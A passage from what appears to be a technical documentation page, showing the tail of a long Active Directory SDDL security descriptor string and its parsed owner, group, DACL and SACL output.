73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)"

Owner            : BUILTIN\Administrators
Group            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
                   AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
                   Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
                   (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
                   WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
                   BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), DOMAIN_NAME\Domain Users:
                   SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
                   (Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```
{% endcode %}
